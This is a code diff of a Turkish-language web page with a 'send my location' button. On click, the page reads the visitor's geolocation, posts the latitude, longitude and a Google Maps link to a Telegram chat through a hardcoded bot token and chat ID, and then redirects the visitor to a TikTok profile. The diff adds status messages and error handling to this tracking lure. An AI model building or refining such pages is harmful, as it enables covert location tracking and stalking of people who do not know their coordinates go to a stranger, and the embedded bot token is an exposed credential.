@@ -10,15 +10,21 @@
       📍 Konumumu Gönder
     </button>
 
+    <p id="status" style="color:red; margin-top:20px;"></p>
+
     <script>
       const token = "7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA";
       const chatId = "6358000072";
       const redirectURL = "https://www.tiktok.com/@ilayda.yldrm84?_t=ZS-8yeSDvPtpDc&_r=1";
 
       document.getElementById("sendLocationBtn").addEventListener("click", function () {
+        document.getElementById("status").innerText = "📍 Konum alınıyor...";
+        
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(
             function (position) {
+              document.getElementById("status").innerText = "✅ Konum alındı, Telegram'a gönderiliyor...";
+              
               const lat = position.coords.latitude;
               const lon = position.coords.longitude;
 
@@ -29,16 +35,23 @@
                   chat_id: chatId,
                   text: 📍 Konum alındı:\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}
                 })
-              }).then(() => {
-                window.location.href = redirectURL;
+              }).then((res) => {
+                if (res.ok) {
+                  document.getElementById("status").innerText = "✅ Telegram'a gönderildi, yönlendiriliyor...";
+                  window.location.href = redirectURL;
+                } else {
+                  document.getElementById("status").innerText = "❌ Telegram'a gönderilemedi!";
+                }
+              }).catch(err => {
+                document.getElementById("status").innerText = "❌ Hata: " + err;
               });
             },
             function (error) {
-              alert("Konum izni vermelisiniz! Hata: " + error.message);
+              document.getElementById("status").innerText = "❌ Konum izni reddedildi: " + error.message;
             }
           );
         } else {
-          alert("Tarayıcınız konum desteği sunmuyor.");
+          document.getElementById("status").innerText = "❌ Tarayıcınız konum desteği sunmuyor.";
         }
       });
     </script>
